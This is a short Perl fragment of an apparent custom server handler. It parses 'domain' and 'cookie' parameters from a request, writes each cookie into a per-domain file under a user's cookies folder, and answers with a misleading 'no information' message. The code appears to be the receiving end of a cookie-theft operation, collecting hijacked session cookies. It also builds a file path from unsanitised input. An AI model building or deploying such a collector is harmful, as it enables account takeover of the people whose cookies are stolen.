$countxz=0;
$cookiextc="";
$filev="";
$pastcontenttype=0;
splice(@valueArray);
$thethings="";

foreach $thethings (@headersforye) {
$countxz++;
if(lc(substr($thethings,0,index($thethings," "))) eq "content-length:"){
$pastcontenttype=1;
}

if($countxz eq ($#headersforye)+1 && $pastcontenttype){
@valueArray=split(/\&/,$thethings);
}
}

if(!($valueArray[0])){
$thethings=substr($url,4);
@valueArray=split(/\&/,$thethings);
}

foreach $lalab (@valueArray){
($namem,$valuem)=split(/\=/,$lalab);

$valuem=~tr/+/ /;
$valuem=~s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;

if($namem eq "domain"){
$filev=$valuem;
}

if($namem eq "cookie"){
$cookiextc=$valuem;
}

}


if(!($cookiextc)){
print $clients "500 No cookie.\n\n";
}elsif(!($filev)){
print $clients "500 No domain.\n\n";
}else{
print $clients "200 There is no information in the item chosed.\n\n";
addToUserFile($userssid,"cookies/$filev.txt","$cookiextc\n");
addToUserFile($userssid,"cookies/list.txt","$filev");
}